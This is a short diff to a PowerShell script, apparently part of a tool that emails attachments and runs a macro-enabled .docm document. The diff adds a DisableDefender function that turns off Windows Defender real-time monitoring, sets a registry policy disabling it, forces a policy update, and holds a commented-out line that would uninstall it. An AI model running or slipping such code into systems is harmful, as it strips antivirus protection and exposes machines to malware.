@@ -59,6 +59,17 @@ function SendEmail($userEmail, $attachment)
     Send-MailMessage @mailParams;   
 }
 
+function DisableDefender()
+{
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
+    gpupdate /force
+
+    #Uninstall-WindowsFeature -Name Windows-Defender
+}
+
 function ExecuteDocm()
 {
     #execute the docm (manually)
